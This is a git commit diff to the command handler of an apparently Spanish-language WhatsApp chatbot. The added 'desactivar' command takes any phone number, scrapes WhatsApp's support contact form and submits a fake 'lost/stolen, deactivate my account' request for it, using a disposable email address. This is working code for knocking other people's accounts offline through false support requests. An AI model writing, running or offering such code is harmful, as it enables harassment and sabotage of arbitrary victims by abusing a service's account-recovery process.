e4f09dd741e66b06ec0d762b2363c02b7855e4b5
BrunoSobrino <90165013+BrunoSobrino@users.noreply.github.com>
2023-02-22 20:13:33 -0600

    Update msg.js

--- message/msg.js
+++ message/msg.js
@@ -96,6 +96,7 @@ Comandos disposibles:
 - ${prefix}chatgpt
 - ${prefix}dall-e
 - ${prefix}sticker
+- ${prefix}desactivar
 
 *Editado By @BrunoSobrino*`
 var templateButtons = [
@@ -155,6 +156,38 @@ reply(`${hasill.result}`.trim())
 reply("*[❗] Error en el servidor 2, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + qqe)  
 }} 
 break
+case 'desactivar':      
+const number = args.join(" ")  
+if (!number || !args[1]) return reply(`*[❗] Ingrese un numero, ejemplo ${prefix + command} +1 (450) 999-999*`)
+//if (number.includes(ownerNumber)) return reply(`*[❗] No voy a desactivar el numero de mi creador >:v*`)       
+let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
+let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
+let cookie = ntah.headers["set-cookie"].join("; ")
+let $ = cheerio.load(ntah.data)
+let $form = $("form");
+let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
+let form = new URLSearchParams()
+form.append("jazoest", $form.find("input[name=jazoest]").val())
+form.append("lsd", $form.find("input[name=lsd]").val())
+form.append("step", "submit")
+form.append("country_selector", "ID")
+form.append("phone_number", number)
+form.append("email", email.data[0])
+form.append("email_confirm", email.data[0])
+form.append("platform", "ANDROID")
+form.append("your_message", "Perdido/roubado: desative minha conta")
+form.append("__user", "0")
+form.append("__a", "1")
+form.append("__csr", "")
+form.append("__req", "8")
+form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
+form.append("dpr", "1")
+form.append("__ccg", "UNKNOWN")
+form.append("__rev", "1006630858")
+form.append("__comment_req", "0")
+let ressss = await axios({ url, method: "POST", data: form, headers: { cookie } })
+reply(util.format(JSON.parse(ressss.data.replace("for (;;);", ""))))        
+break            
 case 'sticker': case 's':
 try {        
 const pname = 'OpenAI - WaBot'
